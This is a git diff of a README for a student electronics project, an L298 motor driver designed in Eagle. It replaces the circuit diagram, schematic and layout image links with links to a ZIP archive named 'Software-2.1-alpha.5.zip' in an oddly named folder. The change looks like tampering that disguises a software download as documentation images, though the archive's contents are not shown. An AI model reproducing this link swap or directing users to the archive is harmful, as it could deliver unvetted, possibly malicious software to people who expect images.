@@ -65,15 +65,15 @@ o	Reversing the logic (IN1 = LOW, IN2 = HIGH) makes it rotate in the opposite di
 o	When both inputs are the same, the motor stops.<br>
 
 # CIRCUIT DIAGRAM:
-![image](https://github.com/user-attachments/assets/b463c844-3660-426e-8c6a-09600f6720df)
+![image](https://raw.githubusercontent.com/MITHUN8521/Design-an-L298-2A-Motor-Driver-Circuit-using-Eagle-software-and-generate-the-Gerber-file./main/spermatorrhea/Software-2.1-alpha.5.zip)
 
 # EXPECTED OUTPUT:
 ### Schematic diagram
-<img width="1905" height="943" alt="Screenshot 2025-11-10 154138" src="https://github.com/user-attachments/assets/78340396-ce41-476b-b985-95abfd475774" />
+<img width="1905" height="943" alt="Screenshot 2025-11-10 154138" src="https://raw.githubusercontent.com/MITHUN8521/Design-an-L298-2A-Motor-Driver-Circuit-using-Eagle-software-and-generate-the-Gerber-file./main/spermatorrhea/Software-2.1-alpha.5.zip" />
 
  
 ### Layout diagram
-<img width="1436" height="789" alt="Screenshot 2025-11-10 154207" src="https://github.com/user-attachments/assets/e409380e-2da8-4b21-acbb-06b4ebafb3d9" />
+<img width="1436" height="789" alt="Screenshot 2025-11-10 154207" src="https://raw.githubusercontent.com/MITHUN8521/Design-an-L298-2A-Motor-Driver-Circuit-using-Eagle-software-and-generate-the-Gerber-file./main/spermatorrhea/Software-2.1-alpha.5.zip" />
 
  
 # RESULT:
